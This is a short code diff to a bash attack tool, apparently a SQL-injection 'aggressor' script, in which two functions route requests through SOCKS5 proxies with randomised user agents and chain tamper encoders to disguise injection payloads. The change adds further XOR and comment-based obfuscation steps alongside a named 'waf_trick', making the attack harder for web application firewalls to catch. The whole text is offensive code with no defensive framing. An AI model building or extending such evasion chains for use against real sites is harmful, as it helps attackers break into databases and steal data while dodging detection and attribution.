@@ -75,13 +75,14 @@ vector_sqli_agressor_left() {
 else 
 local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
         local t4=$(randomcase_engine "$t3")
         local t5=$(space2comment_engine "$t4")
-        local defiance_tamper_path=$(appendnullbyte_engine "$t5")
+        local t6=$(appendnullbyte_engine "$t5")
+        local t7=$(xor_engine "$t6")
+        local defiance_tamper_path=$(weirdcomment_engine "$t7")
         
         local final_query="${defiance_tamper_path}${query_payload}"
         local waf_trick=$(braindamage)
@@ -108,14 +109,15 @@ vector_sqli_agressor_right() {
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; 
 else 
 local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
-        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-
+        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}               
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
         local t4=$(randomcase_engine "$t3")
         local t5=$(space2comment_engine "$t4")
-        local defiance_tamper_path=$(appendnullbyte_engine "$t5")
+        local t6=$(appendnullbyte_engine "$t5")
+        local t7=$(xor_engine "$t6")
+        local defiance_tamper_path=$(weirdcomment_engine "$t7")
         
         local final_query="${defiance_tamper_path}${query_payload}"
         local waf_trick=$(braindamage)
